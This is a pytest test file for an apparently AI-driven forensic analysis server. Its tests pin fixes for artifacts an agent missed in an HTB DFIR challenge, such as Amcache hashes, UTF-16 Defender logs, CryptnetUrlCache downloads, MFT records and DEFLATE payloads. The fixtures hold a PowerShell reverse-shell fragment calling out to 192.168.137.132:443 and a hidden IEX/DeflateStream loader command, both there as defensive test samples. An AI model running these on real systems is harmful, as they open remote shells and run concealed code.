"""Tools say what they did not show (EX-03), and the artifacts the SillyEli run missed.

The HTB SillyEli run answered 9 of 16 questions. Most misses were not
missing parsers: the data was indexed, but a tool showed part of it
without saying so and the agent concluded it was absent. These tests pin
the fixes for each case:

- search showed the first 300 characters of a window, hiding the matching
  Amcache row (the TeamsSetup.exe SHA-1);
- get_amcache read the SYSTEM hive instead of Amcache;
- read_evidence_file treated the UTF-16 Defender log as binary;
- the CryptnetUrlCache (certutil download) and the resident Teams.ps1 in
  the $MFT had no tool;
- the PowerShell payload was base64 over raw DEFLATE;
- SrumECmd failed three times with the same unexplained message;
- the report listed 24,609 file hashes.
"""

from __future__ import annotations

import base64
import struct
import subprocess
import zlib
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from mulder.server.helpers import detect_text_encoding, extract_strings, windowed_response
from tests.mft_builder import build_mft, build_record

_SHA1 = "de733beed2e0d1a4c0f7a1f0b0b8c5d4e3f2a1b0"
_URL = "http://tmpfiles.org/dl/1234/sharphound.zip"
_PS_PAYLOAD = (
    '$c = New-Object System.Net.Sockets.TCPClient("192.168.137.132",443);'
    "$s = $c.GetStream();[byte[]]$b = 0..65535|%{0}"
)
_TEAMS_PS1 = (
    b'powershell -nop -w hidden -c "IEX(New-Object IO.StreamReader('
    b"(New-Object IO.Compression.DeflateStream([IO.MemoryStream]"
    b"[Convert]::FromBase64String('AAAA'),[IO.Compression.CompressionMode]::Decompress)),"
    b'[Text.Encoding]::ASCII)).ReadToEnd()"'
)

_CACHE = "Users/eli/AppData/LocalLow/Microsoft/CryptnetUrlCache"
_FILETIME = 133753318940000000  # 2024-11-06T01:58:14Z


def _metadata(url: str, size: int, etag: str = '"abc"') -> bytes:
    url_b = (url + "\x00").encode("utf-16-le")
    etag_b = (etag + "\x00").encode("utf-16-le")
    head = bytearray(0x74)
    struct.pack_into("<I", head, 0x0C, len(url_b))
    struct.pack_into("<Q", head, 0x10, _FILETIME)
    struct.pack_into("<Q", head, 0x58, _FILETIME - 10**9)
    struct.pack_into("<I", head, 0x64, len(etag_b))
    struct.pack_into("<I", head, 0x70, size)
    return bytes(head) + url_b + etag_b


_ZIP = b"PK\x03\x04" + b"\x00" * 60
_DEFENDER_LOG = "\r\n".join(
    [
        "Internal signature match:SubmissionId:{0000} ThreatId:2147735505",
        "DETECTION Trojan:PowerShell/ReverseShell.HNAA!MTB "
        r"file:C:\Users\Eli\AppData\Local\Temp\Teams.ps1",
    ]
    + [f"filler line {i}" for i in range(200)]
)


def _volume(root: Path) -> Path:
    files: dict[str, bytes] = {
        "$MFT": build_mft(
            {
                40: build_record("Teams.ps1", data=_TEAMS_PS1),
                41: build_record("big.bin", nonresident_size=5_000_000),
                42: build_record("gone.bat", data=b"@echo off\r\ndel x", in_use=False),
            },
            count=64,
        ),
        "Windows/System32/config/SYSTEM": b"regf",
        f"{_CACHE}/MetaData/AAA111": _metadata(_URL, len(_ZIP)),
        f"{_CACHE}/Content/AAA111": _ZIP,
        f"{_CACHE}/MetaData/BBB222": _metadata(
            "http://crl.microsoft.com/pki/crl/products/MicRooCerAut2011.crl", 1200
        ),
        f"{_CACHE}/Content/BBB222": b"0\x82\x04\xb0",
        "ProgramData/Microsoft/Windows Defender/Support/MPDetection-1106.log": (
            _DEFENDER_LOG.encode("utf-16-le")
        ),
        "ProgramData/Microsoft/Windows Defender/Support/MPLog-bom.log": (
            b"\xff\xfe" + "Threat Trojan:Win32/Test".encode("utf-16-le")
        ),
    }
    for rel, data in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
    return root


@pytest.fixture()
def case(tmp_path: Path) -> Path:
    """An open case over a triage collection; returns the volume root."""
    from mulder.server.app import _tool_dispatch_sync, init_server

    root = _volume(tmp_path / "evidence" / "ELI-PC" / "C")
    init_server(db_dir=tmp_path / "cases")
    result = _tool_dispatch_sync["scan_evidence"](
        evidence_path=str(tmp_path / "evidence"), case_id="sillyeli"
    )
    assert result["status"] == "success", result
    return root


def _call(name: str, **kwargs: Any) -> dict[str, Any]:
    from mulder.server.app import _tool_dispatch_sync

    return _tool_dispatch_sync[name](**kwargs)  # type: ignore[no-any-return]


def _windows(result: dict[str, Any]) -> list[dict[str, Any]]:
    """Search hits are ``{"window": {...}, "source_name": ...}``; windowed tools return windows."""
    return [r.get("window", r) for r in result["results"]]


def _index(text: str, source: str, path: str = "/evidence/x") -> None:
    from mulder.server.extract_helpers import extract_and_index

    extract_and_index(text, source, path, "test")


def _amcache_csv(rows: int = 30, target: int = 24) -> str:
    lines = ["ProgramName,FullPath,SHA1,FileSize"]
    for i in range(rows):
        name = "TeamsSetup.exe" if i == target else f"program{i:03d}.exe"
        sha1 = _SHA1 if i == target else f"{i:040x}"
        lines.append(f"{name},C:\\Users\\Eli\\Downloads\\{name},{sha1},{1000 + i}")
    return "\n".join(lines)


class TestSearchSnippets:
    def test_match_deep_in_a_window_is_shown(self, case: Path) -> None:
        _index(_amcache_csv(), "ez.amcache")
        result = _call("search", query="TeamsSetup", source="ez.amcache")

        (hit,) = [w for w in _windows(result) if "TeamsSetup" in w["raw_text"]]
        assert _SHA1 in hit["raw_text"]
        assert hit["match_offset"] > 300
        assert hit["match_count"] >= 1
        assert hit["truncated"] is True
        assert hit["full_length"] > len(hit["raw_text"])
        assert "chars...]" in hit["raw_text"]

    def test_regex_search_is_centred_too(self, case: Path) -> None:
        _index(_amcache_csv(), "ez.amcache")
        result = _call("search", query="(?i)teamssetup", source="ez.amcache", regex=True)
        assert any(_SHA1 in w["raw_text"] for w in _windows(result))

    def test_window_without_the_term_keeps_the_head(self) -> None:
        from mulder.server.tools.core import _fts_terms_pattern, _snippet_window

        d = _snippet_window({"raw_text": "x" * 1000}, _fts_terms_pattern(["absent"]))
        assert d["match_count"] == 0
        assert d["truncated"] is True
        assert str(d["raw_text"]).startswith("xxx")

    def test_fts_operators_are_not_matched(self) -> None:
        from mulder.server.tools.core import _fts_terms_pattern

        pattern = _fts_terms_pattern(['"Teams.ps1" OR TeamsUpdater NOT anydesk'])
        assert pattern is not None
        assert pattern.search("dropped Teams.ps1")
        assert pattern.search("TEAMSUPDATER task")
        assert not pattern.search("OR NOT")


class TestGetAmcache:
    def test_reads_amcache_not_the_system_hive(self, case: Path) -> None:
        _index("ControlSet001\\Services\\Tcpip", "registry.system")
        _index(_amcache_csv(rows=3, target=1), "ez.amcache")
        result = _call("get_amcache")
        text = " ".join(str(r.get("raw_text", "")) for r in result["results"])
        assert _SHA1 in text
        assert "Tcpip" not in text


class TestWindowedResponse:
    def test_partial_view_is_flagged(self) -> None:
        windows = [{"id": i, "raw_text": "y" * 50_000, "source_name": "s"} for i in range(80)]
        resp = windowed_response("tc_1", windows, "s", "tool", {}, 1.0)
        assert resp["truncated"] is True
        assert resp["windows_not_shown"] > 0
        assert resp["windows_with_text_cut"] > 0
        assert "Absence from this view proves nothing" in str(resp.get("hint", ""))

    def test_complete_view_is_not_flagged(self) -> None:
        resp = windowed_response("tc_1", [{"id": 1, "raw_text": "z"}], "s", "tool", {}, 1.0)
        assert not resp.get("truncated")


class TestEncodingHelpers:
    @pytest.mark.parametrize(
        ("sample", "expected"),
        [
            ("héllo wörld".encode(), "utf-8"),
            (b"\xff\xfe" + "abc".encode("utf-16-le"), "utf-16-le"),
            ("Threat detected".encode("utf-16-le"), "utf-16-le"),
            ("Threat detected".encode("utf-16-be"), "utf-16-be"),
            ("caf\xe9 cr\xe8me".encode("cp1252"), "cp1252"),
            (bytes(range(256)) * 4, "binary"),
        ],
    )
    def test_detect(self, sample: bytes, expected: str) -> None:
        assert detect_text_encoding(sample) == expected

    def test_strings_find_ascii_and_utf16(self) -> None:
        data = b"\x00\x01" + b"certutil.exe" + b"\x00\x00\x02" + _URL.encode("utf-16-le")
        found = extract_strings(data)
        assert "certutil.exe" in found
        assert _URL in found


class TestReadEvidenceFile:
    _LOG = "ProgramData/Microsoft/Windows Defender/Support/MPDetection-1106.log"

    def test_utf16_without_bom_is_decoded(self, case: Path) -> None:
        result = _call("read_evidence_file", file_path=str(case / self._LOG))
        assert result["encoding"] == "utf-16-le"
        assert result["is_binary"] is False
        assert "Trojan:PowerShell/ReverseShell.HNAA!MTB" in str(result["content"])

    def test_utf16_with_bom(self, case: Path) -> None:
        path = case / "ProgramData/Microsoft/Windows Defender/Support/MPLog-bom.log"
        result = _call("read_evidence_file", file_path=str(path))
        assert str(result["content"]).startswith("Threat Trojan:Win32/Test")

    def test_pagination_covers_the_whole_file(self, case: Path) -> None:
        path = str(case / self._LOG)
        size = (case / self._LOG).stat().st_size
        seen = ""
        offset = 0
        for _ in range(50):
            result = _call("read_evidence_file", file_path=path, max_bytes=1001, offset=offset)
            assert result["file_size"] == size
            seen += str(result["content"])
            assert result["truncated"] is True  # the file is larger than one page
            if "next_offset" not in result:
                assert "end of file" in str(result["note"])
                break
            assert "PARTIAL" in str(result["note"])
            offset = int(result["next_offset"])
            assert offset % 2 == 0
        else:
            pytest.fail("pagination did not end")
        assert seen == _DEFENDER_LOG

    def test_utf8_pages_never_split_a_character(self, case: Path) -> None:
        text = "Réunion équipe — café ☕ à 10h 😀\n" * 40
        path = case / "Users/eli/Documents/notes.txt"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        seen, offset = "", 0
        while True:
            result = _call("read_evidence_file", file_path=str(path), max_bytes=7, offset=offset)
            assert "\ufffd" not in str(result["content"])
            seen += str(result["content"])
            if "next_offset" not in result:
                break
            offset = int(result["next_offset"])
        assert seen == text

    def test_binary_file_lists_its_strings(self, case: Path) -> None:
        path = case / _CACHE / "MetaData/AAA111"
        result = _call("read_evidence_file", file_path=str(path))
        assert result["is_binary"] is True
        assert _URL in result["strings"]
        assert result["hex_preview"]


class TestCryptnetUrlCache:
    def test_metadata_parser(self) -> None:
        from mulder.server.tools.extract.cryptnet import parse_cryptnet_metadata

        meta = parse_cryptnet_metadata(_metadata(_URL, 64))
        assert meta == {
            "url": _URL,
            "last_download_time": "2024-11-06T01:58:14Z",
            "last_modified_header": "2024-11-06T01:56:34Z",
            "etag": "abc",
            "file_size": 64,
        }
        assert parse_cryptnet_metadata(b"short") is None

    def test_url_is_read_to_its_terminator_not_by_the_size_field(self) -> None:
        """Bytes of the SillyEli certutil entry: the size field says 100, the URL takes 108."""
        from mulder.server.tools.extract.cryptnet import parse_cryptnet_metadata

        url = "https://filebin.net/archive/0rkhisv2iq4slveo/kape.zip"
        etag = '"ff5183968015c93jd847cf91cf071373-17"'
        data = bytearray(_metadata(url, 139_551_589, etag))
        struct.pack_into("<I", data, 0x0C, 100)
        meta = parse_cryptnet_metadata(bytes(data))
        assert meta is not None
        assert meta["url"] == url
        assert meta["etag"] == etag.strip('"')

    @pytest.mark.parametrize(
        ("url", "routine"),
        [
            ("http://crl.microsoft.com/pki/crl/products/x.crl", True),
            ("http://ocsp.digicert.com/MFEwTzBN", True),
            ("http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/x.cab", True),
            ("http://www.microsoft.com/pkiops/certs/x.crt", True),
            (_URL, False),
            ("https://download.microsoft.com/payload.exe", False),
        ],
    )
    def test_pki_filter(self, url: str, routine: bool) -> None:
        from mulder.server.tools.extract.cryptnet import _is_routine_pki

        assert _is_routine_pki(url) is routine

    def test_tool_flags_the_certutil_download(self, case: Path) -> None:
        result = _call("parse_cryptnet_url_cache", image_path=str(case))
        assert result["status"] == "success", result
        payload = result["results"]
        assert payload["entries"] == 2
        (download,) = payload["non_pki_downloads"]
        assert download["url"] == _URL
        assert download["profile"] == "eli"
        assert download["content_type"] == "zip"
        assert download["last_download_time"] == "2024-11-06T01:58:14Z"

        hits = _call("search", query="NON-PKI", source="cryptnet.urlcache")
        assert any(_URL in w["raw_text"] for w in _windows(hits))


class TestDeflatePayload:
    def test_raw_deflate_behind_base64(self) -> None:
        from mulder.server.tools.core import _try_inflate

        comp = zlib.compressobj(9, zlib.DEFLATED, -15)
        raw = comp.compress(_PS_PAYLOAD.encode()) + comp.flush()
        assert _try_inflate(raw) == ("deflate", _PS_PAYLOAD.encode())
        assert _try_inflate(zlib.compress(b"hello hello hello")) == ("zlib", b"hello hello hello")
        assert _try_inflate(b"plain text is left alone") is None

    def test_decode_payload_inflates(self, case: Path) -> None:
        comp = zlib.compressobj(9, zlib.DEFLATED, -15)
        blob = base64.b64encode(comp.compress(_PS_PAYLOAD.encode()) + comp.flush()).decode()
        result = _call("decode_payload", data=blob, encoding="base64")
        assert "192.168.137.132" in str(result)


class TestMftRecord:
    def test_by_entry(self, case: Path) -> None:
        result = _call("extract_mft_record", image_path=str(case), entry=40)
        assert result["status"] == "success", result
        (rec,) = result["results"]["records"]
        assert rec["in_use"] is True
        assert rec["names"][0]["name"] == "Teams.ps1"
        (stream,) = rec["streams"]
        assert stream["resident"] is True
        assert stream["text"] == _TEAMS_PS1.decode()
        assert rec["indexed_source"] == "mftrecord.40"

        # Its source must not make run_mft_parser believe the $MFT is already parsed.
        from mulder.server.helpers import sources_already_indexed

        assert sources_already_indexed(["mft.", "ez.mft"], evidence_path=str(case)) == []

    def _records(self, result: dict[str, Any]) -> list[dict[str, Any]]:
        assert result["status"] == "success", result
        return list(result["results"]["records"])

    def test_by_name_is_case_insensitive(self, case: Path) -> None:
        (rec,) = self._records(
            _call("extract_mft_record", image_path=str(case), file_name="TEAMS.PS1")
        )
        assert rec["entry"] == 40

    def test_non_resident_and_deleted_are_explained(self, case: Path) -> None:
        (big,) = self._records(_call("extract_mft_record", image_path=str(case), entry=41))
        assert "Non-resident" in big["streams"][0]["note"]
        (gone,) = self._records(_call("extract_mft_record", image_path=str(case), entry=42))
        assert gone["in_use"] is False
        assert "Deleted record" in gone["note"]
        assert "@echo off" in gone["streams"][0]["text"]

    def test_unknown_name(self, case: Path) -> None:
        result = _call("extract_mft_record", image_path=str(case), file_name="nope.exe")
        assert result["status"] == "error"


class TestEzToolFailures:
    def _run(self, force: bool = False) -> dict[str, object]:
        import time

        from mulder.server.tools.extract import misc

        return misc._run_ez_tool(
            "SrumECmd.dll",
            ["-f", "/x/SRUDB.dat"],
            "ez.srum",
            "/x/SRUDB.dat",
            "tc_test",
            "run_srum_parser",
            {"image_path": "/x", "force": force},
            time.monotonic(),
        )

    def test_error_carries_tool_output_and_is_not_rerun(self, case: Path) -> None:
        from mulder.server.tools.extract import misc

        proc = subprocess.CompletedProcess(
            args=[], returncode=1, stdout="Processing...\n", stderr="Error: database is dirty\n"
        )
        with (
            patch.object(misc, "require_binary", return_value=True),
            patch.object(misc, "_find_ez_tool", return_value="/opt/SrumECmd.dll"),
            patch.object(misc.subprocess, "run", return_value=proc) as run,
        ):
            first = self._run()
            second = self._run()
            forced = self._run(force=True)

        assert "exit code 1" in str(first["error_message"])
        assert "database is dirty" in str(first["error_message"])
        assert "esentutl" in str(first.get("suggestion", ""))
        assert "already failed" in str(second["error_message"])
        assert run.call_count == 2  # first and forced; the second was answered from memory
        assert "exit code 1" in str(forced["error_message"])


class TestReportHashes:
    def test_hash_table_is_capped(self, tmp_path: Path) -> None:
        from mulder.models import AuditSummary, CaseMetadataRow
        from mulder.report.renderer import ReportRenderer

        meta = CaseMetadataRow(
            case_id="hashes",
            ingested_at="2025-01-01T00:00:00Z",
            evidence_root="/evidence",
            extractor_versions={},
        )
        summary = AuditSummary(
            total_tool_calls=1,
            total_findings=0,
            tool_call_counts={},
            total_duration_ms=1,
            first_timestamp="2025-01-01T00:00:00Z",
            last_timestamp="2025-01-01T00:00:01Z",
        )
        audit = tmp_path / "audit.jsonl"
        audit.write_text("")
        rows: list[dict[str, object]] = [
            {"file_path": f"/evidence/f{i}", "sha256": f"{i:064x}", "size_bytes": i}
            for i in range(120)
        ]
        md, html, _pdf = ReportRenderer().render_all(
            meta, [], summary, audit, evidence_integrity=rows, generate_pdf=False
        )
        for text in (md, html):
            assert f"{49:064x}" in text
            assert f"{50:064x}" not in text
            assert "The 70 other hashes" in text


@pytest.mark.parametrize(
    "role_name",
    [
        "EXTRACT_EXECUTOR",
        "EXTRACT_ANALYST",
        "CROSS_EXECUTOR",
        "CROSS_ANALYST",
        "NARRATIVE_EXECUTOR",
        "NARRATIVE_ANALYST",
    ],
)
def test_decode_payload_is_available_to_every_executor_and_analyst(role_name: str) -> None:
    """The extraction analyst was told to use decode_payload but could not call it.

    On a real run it then wrote that the Deflate-compressed Teams.ps1 "cannot
    be inflated by hand" and left the C2 address unresolved.
    """
    import mulder.server.tools  # noqa: F401  (registers the tools)
    from mulder.server.tool_access import Role, get_tools_for_role

    assert any("decode_payload" in t for t in get_tools_for_role(Role[role_name]))
